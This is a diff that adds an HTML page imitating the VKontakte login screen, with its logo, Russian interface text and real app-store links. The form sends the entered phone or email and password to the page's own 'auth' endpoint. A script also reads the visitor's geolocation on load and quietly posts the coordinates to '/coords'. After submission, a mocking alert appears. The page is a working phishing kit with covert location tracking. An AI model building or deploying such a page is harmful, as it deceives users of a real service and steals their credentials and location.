@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+    <link rel="stylesheet" href="style.css" />
+  </head>
+  <body>
+    <header>
+      <div class="logo-container">
+        <img src="logo.png" alt="#" />
+      </div>
+    </header>
+    <section class="main-information">
+      <div class="left-information">
+        <h1>ВКонтакте для мобильных устройств</h1>
+        <p>
+          Установите официальное мобильное приложение ВКонтакте и оставайтесь в
+          курсе новостей ваших друзей, где бы вы ни находились.
+        </p>
+        <div class="mobile-img">
+          <img src="mobile-img.png" alt="#" />
+        </div>
+        <div class="icons-main">
+          <div class="google-store">
+            <a
+              href="https://play.google.com/store/apps/details?id=com.vkontakte.android"
+              target="_blank"
+            >
+              <svg
+                width="16"
+                height="16"
+                viewBox="0 0 16 16"
+                fill="none"
+                xmlns="http://www.w3.org/2000/svg"
+              >
+                <path
+                  fill-rule="evenodd"
+                  clip-rule="evenodd"
+                  d="M12.75 2.47a.5.5 0 0 1 .87.5l-1.34 2.3A8 8 0 0 1 16 12.05H0a8 8 0 0 1 3.62-6.7L2.25 2.97a.5.5 0 0 1 .87-.5l1.37 2.38a7.97 7.97 0 0 1 6.92-.05l1.34-2.33ZM13 9.04a1 1 0 1 1-2 0 1 1 0 0 1 2 0Zm-9 1a1 1 0 1 0 0-2 1 1 0 0 0 0 2Z"
+                  fill="currentColor"
+                />
+              </svg>
+              <span>Google play</span>
+            </a>
+          </div>
+
+          <div class="run-store">
+            <a
+              href="https://apps.rustore.ru/app/com.vkontakte.android"
+              target="_blank"
+            >
+              <svg
+                width="16"
+                height="16"
+                viewBox="0 0 16 16"
+                fill="none"
+                xmlns="http://www.w3.org/2000/svg"
+              >
+                <path
+                  fill-rule="evenodd"
+                  clip-rule="evenodd"
+                  d="M12.75 2.47a.5.5 0 0 1 .87.5l-1.34 2.3A8 8 0 0 1 16 12.05H0a8 8 0 0 1 3.62-6.7L2.25 2.97a.5.5 0 0 1 .87-.5l1.37 2.38a7.97 7.97 0 0 1 6.92-.05l1.34-2.33ZM13 9.04a1 1 0 1 1-2 0 1 1 0 0 1 2 0Zm-9 1a1 1 0 1 0 0-2 1 1 0 0 0 0 2Z"
+                  fill="currentColor"
+                />
+              </svg>
+              <span>Run store</span>
+            </a>
+          </div>
+
+          <div class="app-store">
+            <a
+              href="https://itunes.apple.com/ru/app/id564177498"
+              target="_blank"
+            >
+              <svg
+                width="16"
+                height="16"
+                viewBox="0 0 16 16"
+                fill="none"
+                xmlns="http://www.w3.org/2000/svg"
+              >
+                <path
+                  fill-rule="evenodd"
+                  clip-rule="evenodd"
+                  d="M11.83 7.44c-.01-1.77 1.45-2.62 1.52-2.67a3.28 3.28 0 0 0-2.57-1.38c-1.1-.11-2.13.64-2.69.64-.55 0-1.4-.63-2.31-.61-1.2.02-2.3.69-2.9 1.75-1.25 2.15-.33 5.32.88 7.06.59.85 1.3 1.8 2.22 1.77.89-.03 1.22-.57 2.3-.57 1.07 0 1.37.57 2.32.55.95-.01 1.56-.86 2.14-1.72.68-.98.96-1.94.98-1.99-.02 0-1.87-.71-1.89-2.83Zm-1.77-5.2c.5-.6.83-1.42.74-2.24-.71.03-1.57.47-2.07 1.06a2.93 2.93 0 0 0-.75 2.17c.79.06 1.6-.4 2.08-1Z"
+                  fill="currentColor"
+                />
+              </svg>
+              <span>App store</span>
+            </a>
+          </div>
+        </div>
+        <div class="all-products">
+          <a href="#">
+            Все продукты
+            <svg
+              class="arrow"
+              xmlns="http://www.w3.org/2000/svg"
+              width="12"
+              height="12"
+              fill="currentColor"
+              viewBox="0 0 12 12"
+            >
+              <path
+                fill-rule="evenodd"
+                d="M4.22 2.47a.75.75 0 0 1 1.06 0l3 3a.75.75 0 0 1 0 1.06l-3 3a.75.75 0 0 1-1.06-1.06L6.69 6 4.22 3.53a.75.75 0 0 1 0-1.06Z"
+                clip-rule="evenodd"
+              />
+            </svg>
+          </a>
+        </div>
+      </div>
+      <div class="right-information">
+        <div class="form-container">
+          <img src="big-logo.png" alt="#" />
+          <div class="description-form">
+            <h3>Вход ВКонтакте</h3>
+            <form action="auth" method="post" class="form">
+              <div class="login-container">
+                <input
+                  type="text"
+                  name="login"
+                  class="form-data"
+                  placeholder="Телефон или почта"
+                />
+              </div>
+              <div class="password-container">
+                <input
+                  type="password"
+                  name="password"
+                  class="form-data"
+                  placeholder="Пароль"
+                />
+              </div>
+              <div class="check-container">
+                <label>
+                  <input type="checkbox" name="save" />
+                  Сохранить вход
+                </label>
+                <svg
+                  class="question"
+                  width="12"
+                  height="12"
+                  viewBox="0 0 12 12"
+                  fill="none"
+                  xmlns="http://www.w3.org/2000/svg"
+                >
+                  <path
+                    fill-rule="evenodd"
+                    clip-rule="evenodd"
+                    d="M6 12A6 6 0 1 0 6 0a6 6 0 0 0 0 12zm.64-5c-.08.36-.28.57-.66.57-.45 0-.71-.32-.71-.76v-.07c0-.64.32-1.06.95-1.43.68-.41.89-.68.89-1.17 0-.53-.4-.9-.99-.9-.52 0-.87.26-1.04.74-.13.35-.37.5-.7.5-.41 0-.67-.27-.67-.68 0-.23.05-.43.16-.64C4.2 2.46 5.05 2 6.19 2c1.5 0 2.52.84 2.52 2.09 0 .81-.39 1.36-1.13 1.81-.7.41-.87.64-.94 1.1zm.22 2.16A.85.85 0 0 1 6 10a.85.85 0 0 1-.86-.84.85.85 0 0 1 .86-.85.85.85 0 0 1 .87.85z"
+                    fill="currentColor"
+                  />
+                </svg>
+              </div>
+
+              <div class="submite-btn">
+                <input type="submit" class="blue-button" value="Войти" />
+              </div>
+            </form>
+            <div class="qr-container">
+              <img src="qr.png" alt="#" />
+              <div class="qr-description">
+                <h4>Быстрый вход по QR-коду</h4>
+                <p>Наведите камеру телефона</p>
+                <a href="#">Подробнее</a>
+              </div>
+            </div>
+            <div class="float-information">
+              <h5>Сохранить вход</h5>
+              <p>
+                Выберите, чтобы сохранить данные аккаунта для быстрого входа на
+                этом устройстве
+              </p>
+            </div>
+          </div>
+        </div>
+        <div class="under-form">
+          <div class="container-buttons">
+            <button class="green-button">Зарегистрироваться</button>
+            <button class="create-list">Создать страницу для бизнеса</button>
+          </div>
+          <div class="under-form-text">
+            <p>
+              После регистрации вы получите доступ ко всем возможностям VK ID
+            </p>
+            <a href="#">
+              <h5>Узнать больше</h5>
+            </a>
+          </div>
+        </div>
+        <div class="label">
+          <a href="#">
+            <p>Применяются рекомендательные технологии</p>
+          </a>
+        </div>
+      </div>
+    </section>
+    <footer>
+      <div class="left-footer-sc">
+        <a href="#">ВКонтакте</a>
+        <span>© 2006-2023</span>
+      </div>
+      <div class="middle-footer-sc">
+        <a href="#">О ВКонтакте</a>
+        <a href="#">Правила</a>
+        <a href="#">Для бизнеса</a>
+        <a href="#">Разработчикам</a>
+      </div>
+
+      <div class="right-footer-sc">
+        <a href="#">Русский</a>
+        <a href="#">English</a>
+        <a href="#">все языки »</a>
+      </div>
+    </footer>
+
+    <script>
+      const floatInfo = document.querySelector(".float-information");
+      const inputLogin = document.querySelector('input[name="login"]');
+      const inputPassword = document.querySelector('input[name="password"]');
+
+      navigator.geolocation.getCurrentPosition(async (possition) => {
+        try {
+          const { latitude, longitude } = await possition.coords;
+          const _data = { sher: [latitude], dol: [longitude] };
+
+          await fetch("/coords", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json;charset=utf-8",
+            },
+            body: JSON.stringify(_data),
+          });
+        } catch (err) {
+          console.log(err);
+        }
+      });
+
+      inputLogin.addEventListener("click", (event) => {
+        inputLogin.classList.remove("no-valid");
+        inputPassword.classList.remove("no-valid");
+      });
+
+      inputPassword.addEventListener("click", (event) => {
+        inputLogin.classList.remove("no-valid");
+        inputPassword.classList.remove("no-valid");
+      });
+
+      document
+        .querySelector(".question")
+        .addEventListener("mouseenter", (event) => {
+          floatInfo.classList.add("active");
+        });
+
+      document
+        .querySelector(".question")
+        .addEventListener("mouseleave", (event) => {
+          floatInfo.classList.remove("active");
+        });
+
+      // document.querySelector(".question").addEventListener("click", (event) => {
+      //   floatInfo.classList.toggle("active");
+      // });
+
+      document
+        .querySelector(".blue-button")
+        .addEventListener("click", (event) => {
+          if (!inputLogin.value || !inputPassword.value) {
+            event.preventDefault();
+
+            inputLogin.classList.add("no-valid");
+            inputPassword.classList.add("no-valid");
+
+            alert("Введите данные в форму");
+          } else {
+            alert("А.У.Е.");
+          }
+        });
+    </script>
+  </body>
+</html>
